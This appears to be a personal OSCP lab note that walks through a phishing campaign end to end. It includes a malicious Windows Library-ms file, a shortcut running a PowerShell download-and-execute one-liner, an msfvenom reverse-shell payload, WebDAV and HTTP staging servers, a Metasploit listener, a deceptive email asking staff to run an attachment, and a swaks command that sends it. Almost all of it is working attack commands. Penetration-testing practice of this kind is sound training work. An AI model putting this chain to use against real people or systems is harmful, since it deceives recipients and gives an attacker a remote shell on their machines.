<% tp.file.rename("1_phishing")%>


## Creating the Payloads
- 1st stage: config.Library-ms
  This opens our remotely hosted 2nd stage dropper like it was a local folder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://HIP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

- 2nd stage (autoconfig.lnk)
```powershell
powershell.exe -NoExit -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.163:8000/revshell.ps1'); revshell"
```

- 3rd stage
```bash
msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.45.163 LPORT=4444 NOEXIT -f raw -o revshell.ps1
```
>  MUST remove the gibberish from the beginning and end of the file, otherwise the payload won't work

## Setup C2

- Host the 2nd stage via webdav (shell 1)
```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/oscp/lab/webdav/
```

- Create a copy of the library and use that to transfer those two files to kali
> Always keep an unused version of this library file as it might get unusable once opened

- Host the 3rd stage via HTTP (shell 2)
```bash
cd /home/kali/oscp/lab/ATP23/phishing/webserver && python3 -m http.server 8000
```

- Receive reverse shell (shell 3)
```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/powershell_reverse_tcp; set LHOST $hip; set LPORT $hport; set ExitOnSession false; run"
```

## Send Phish
- Example contents for body.txt
```
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.

On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

John
```

- Shell 4
```bash
cd ~/oscp/lab/ATP23/phishing/ && sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.209.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```
